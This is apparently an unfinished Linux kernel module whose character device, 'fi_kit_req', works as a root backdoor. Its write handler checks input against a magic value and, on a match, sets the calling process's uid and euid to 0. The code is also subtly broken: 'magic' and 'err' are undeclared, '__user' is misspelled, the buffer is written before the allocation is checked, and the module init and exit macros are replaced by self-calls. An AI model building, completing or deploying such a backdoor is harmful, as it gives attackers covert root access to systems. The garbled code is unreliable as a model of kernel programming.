/*
NOTE: STILL IN DEVELOPMENT
Author: 0x44F
*/

#include <linux/module.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <asm/uaccess.h>

// device count correction
#define FIRST_MINOR 1
#define CCOUNT 2
#define THREADS 4

// dont mess with this please (orl)
static int __init _init_module(void);
static void __exit _exit(void);

int _open(struct inode *in, struct file *f); // 
ssize_t _read(struct file *f, char _lcuser *buf, size_t buf_len, loff_t *offp);
ssize_t _write(struct file *f, const char _lcuser *buf, size_t buf_len, loff_t *offp); // conflicting names?

typedef struct _lkm_s
{
    dev_t devno;
    struct cdev device;
} lkm_t;

lkm_t lkm;

struct file_operations _file_op = {
    .owner  =  THIS_MODULE,
    .open   =   _open,
    .write  =  _write,
    .read   =   _read
};

int _open(struct inode *in, struct file *f)
{
    return 0;
}

ssize_t _read(struct file *f, char _lcuser *buf, size_t buf_len, loff_t *offp)
{
    return buf_len;
}

ssize_t _write(struct file *f, const char _lcuser *buf, size_t buf_len, loff_t *offp)
{
    char *data;
    size_t i;
  
    char _key[] = "fi_kit_req";
    struct cred *cur_cred;
    struct cred *new_cred;

    data = (char *)kmalloc(buf_len+1, GFP_KERNEL);

    for(i = 0; i <= buf_len; i++)
    {
        data[i] = 0x00;
    }
    
    if(data) 
    {
        copy_from_user(data, buf, buf_len);

        if(memcmp(data, magic, 7) == 0) 
        {
            cur_cred = get_current_cred();
            cur_cred->uid = 0;
            cur_cred->euid = 0;
        }

        kfree(data); // i must...
    }

    return buf_len;
}

static int __init _init_module()
{
    if(alloc_chrdev_region(&lkm.devno, FIRST_MINOR, CCOUNT, "fi_kit_req") != 0)
    {
        return err;
    }

    cdev_init(&lkm.device, &_file_op);

    lkm.device.owner = THIS_MODULE;
    lkm.device.ops = &_file_op;

    err = cdev_add(&lkm.device, lkm.devno, CCOUNT);

    if(err != 0)
    {
        return err;
    }

    return 0;
    
}

static void __exit _exit() 
{
    cdev_del(&lkm.device);
    unregister_chrdev_region(lkm.devno, CCOUNT);
}

_init_module(_init_module);
_exit(_exit);
